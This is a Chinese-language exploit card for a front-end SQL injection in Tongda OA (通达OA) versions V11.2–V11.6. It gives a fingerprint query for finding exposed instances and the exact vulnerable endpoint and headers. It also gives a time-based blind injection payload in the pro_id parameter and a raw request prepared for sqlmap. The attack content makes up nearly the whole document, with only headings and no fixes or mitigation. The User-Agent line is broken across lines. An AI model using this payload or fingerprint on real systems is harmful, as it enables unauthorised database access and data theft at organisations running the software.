# 通达OApro_id存在前台SQL注入漏洞

- **系统**：通达OA　|　**类型**：SQL注入　|　**CVE**：—
- **指纹**：`app.name="通达 OA"`
- **请求**：`POST /general/appbuilder/web/officeproduct/productapply/applyprobygroup HTTP/1.1`
- **关键头**：`Host: {hostname}`　`Content-Length: 39`　`X-Requested-With: XMLHttpRequest`　`UserAgent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.103 Safar`

**请求体 / payload**
```
i/537.36
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
arr[5][pro_id]=151' AND (SELECT 8770 FROM (SELECT(SLEEP(5)))STfQ) AND 'nbmT'='nbmT

sqlmap
POST /general/appbuilder/web/officeproduct/productapply/applyprobygroup HTTP/1.1
Host: {hostname}
Content-Length: 39
X-Requested-With: XMLHttpRequest
UserAgent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.103 Safar
i/537.36
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
arr[5][pro_id]=151
```

**其他**
- 通达OA pro\_id存在前台SQL注入漏洞: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * 通达OA V11.2-V11.6